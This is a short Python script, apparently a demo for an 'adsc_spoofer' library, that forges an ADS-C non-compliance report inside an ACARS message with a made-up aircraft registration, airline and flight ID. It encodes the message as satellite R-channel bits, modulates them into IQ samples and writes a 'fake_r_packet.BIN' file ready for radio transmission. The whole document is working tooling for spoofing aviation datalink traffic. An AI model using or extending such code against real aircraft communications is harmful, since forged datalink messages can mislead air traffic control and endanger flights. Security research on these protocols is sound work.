from adsc_spoofer import (
    modulate,
    down_noncompliance,
    get_r_channel_bits,
    get_acars_message,
)


adsc_message = down_noncompliance(
    8,
    [
        {
            "group_tag": 13,
            "group_undefined": False,
        },
        {"group_tag": 27, "group_undefined": False, "unavailable_params": [1]},
    ],
)


acars_message = get_acars_message(
    adsc_message,
    ".9XR-WP",
    "BZVCAYA",
    "W",
    message_source="F",
    message_number="11",
    bsc="A",
    airline_id="LH",
    flight_id="1234",
    up=False,
)
bits = get_r_channel_bits(acars_message, "06E010", "C1", 7, 9, 5)


with open("./fake_r_packet.BIN", "wb") as f:
    iq_samples = modulate(bits, data_rate=1200)
    print(iq_samples.shape)
    f.write(iq_samples.tobytes())
